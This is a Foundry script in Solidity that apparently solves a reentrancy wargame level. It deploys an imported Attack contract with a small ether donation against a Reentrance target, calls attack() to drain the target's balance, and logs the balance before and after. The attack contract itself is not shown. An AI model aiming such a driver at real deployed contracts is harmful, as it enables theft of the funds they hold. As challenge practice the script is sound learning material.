// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Re-entrancy/Reentrancy.sol";
import "../src/Re-entrancy/Attack.sol";

contract ReentranceSolution is Script {
    Reentrance public reentrancyInstance = Reentrance(payable(<your_contract_address>)); 

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Initial Contract Balance:", address(reentrancyInstance).balance);

        // Attack 
        uint256 attackValue = 0.001 ether;  // Donate amount
        Attack attacker = new Attack {value: attackValue}(reentrancyInstance);
        attacker.attack();

        console.log("Final Contract Balance:", address(reentrancyInstance).balance);  // 0 or drained

        vm.stopBroadcast();
    }
}